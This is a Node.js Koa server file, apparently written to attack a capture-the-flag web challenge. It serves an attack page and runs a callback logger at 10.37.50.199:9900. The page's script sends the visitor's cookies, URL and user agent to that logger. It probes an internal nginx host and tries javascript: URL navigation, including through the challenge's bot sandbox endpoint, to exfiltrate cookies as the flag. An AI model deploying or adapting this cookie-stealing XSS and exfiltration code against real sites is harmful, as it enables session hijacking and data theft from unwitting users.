import Koa from 'koa';
import n from './fetch.js';
const app = new Koa();
const url = "https://blog.csdn.net/qq744746842/article/details/114265353";
const publicBase = "http://10.37.50.199:9900";
app.use(async (ctx, next) => {
  if (ctx.request.path === '/log') {
    // Keep callback logs compact so FLAG or browser errors are easy to spot.
    console.log('[xss-log]', ctx.request.query);
    ctx.status = 204;
    return;
  }
  if(ctx.request.path === '/a'){
    ctx.redirect('/b');
    return;
  }
  await next();
  console.log('1');
});
app.use(async (ctx, next) => {
  if(ctx.request.path === '/a'){
    ctx.status = 200;
    ctx.body = 'a';
  } else if(ctx.request.path === '/b'){
    ctx.status = 200;
    ctx.body = `<iframe id="TopFrame" name="PREVIEW_TARGET_0" src="${url}" referrer-policy="no-referrer" width="377" height="764" class="iframe-box" style="border: 1px solid rgb(241, 241, 241);">loading</iframe>
    <iframe id="TopFrame2" name="PREVIEW_TARGET_1" src="${url}" referrer-policy="no-referrer" width="377" height="764" class="iframe-box" style="border: 1px solid rgb(241, 241, 241);">loading</iframe>
`;
  } else if(ctx.request.path === '/c'){
    const result = await n();
    console.log('--------------------', Object.keys(result));
    ctx.status = 200;
    ctx.body = result.data;
  } else {
    console.log('--------------------', ctx.request);
    ctx.status = 200;
    ctx.body = `<!doctype html>
<meta charset="utf-8">
<script>
const LOG = "${publicBase}/log";

function leak(type, value = "") {
  new Image().src = LOG + "?" + new URLSearchParams({
    type,
    value,
    href: location.href,
    cookie: document.cookie,
    ua: navigator.userAgent,
    t: Date.now()
  });
}

leak("loaded");

// 探测能不能访问题目内网 nginx；这只能证明请求发出，不能读响应。
fetch("http://nginx/sys/", { mode: "no-cors" })
  .then(() => leak("nginx_fetch_sent"))
  .catch(e => leak("nginx_fetch_error", e.name + ":" + e.message));

// 探测跨源 frame 限制。
const f = document.createElement("iframe");
f.src = "http://nginx/sys/";
(document.body || document.documentElement).appendChild(f);

setTimeout(() => {
  try {
    leak("frame_href", f.contentWindow.location.href);
  } catch (e) {
    leak("frame_blocked", e.name + ":" + e.message);
  }

  try {
    f.contentWindow.location =
      "javascript:fetch('" + LOG + "?flag='+encodeURIComponent(document.cookie))";
  } catch (e) {
    leak("jsnav_blocked", e.name + ":" + e.message);
  }
}, 1000);

setTimeout(() => {
  const js = "javascript:fetch('" + LOG + "?flag='+encodeURIComponent(document.cookie))";
  leak("self_nav_bot_sandbox");
  location.href = "http://nginx/bot/sandbox?target=" + encodeURIComponent(js);
}, 2500);
</script>`;
    await next();

  }
});
app.listen(9900, ()=>{console.log('start', publicBase);});
